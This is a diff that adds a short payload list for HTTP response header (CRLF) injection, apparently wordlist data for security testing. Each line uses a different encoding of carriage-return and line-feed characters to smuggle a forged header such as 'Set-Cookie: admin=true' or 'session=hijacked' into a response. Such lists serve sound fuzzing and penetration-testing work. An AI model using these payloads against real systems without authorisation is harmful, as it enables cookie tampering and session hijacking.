@@ -1,0 +1,14 @@
+
+%0d%0aX-Injected: true
+%0d%0aX-Custom-Header: test
+%0d%0aSet-Cookie: injected=true
+%0dSet-Cookie:%20admin=true
+%0aSet-Cookie:%20admin=true
+%0r%0nSet-Cookie:%20session=hijacked
+\r\nX-Injected: true
+\n\rX-Injected: true
+%0ASet-Cookie: admin=true
+%0DSet-Cookie: admin=true
+%20%0d%0aSet-Cookie: admin=true
+%09%0d%0aSet-Cookie: admin=true
+;%0d%0aSet-Cookie: admin=true
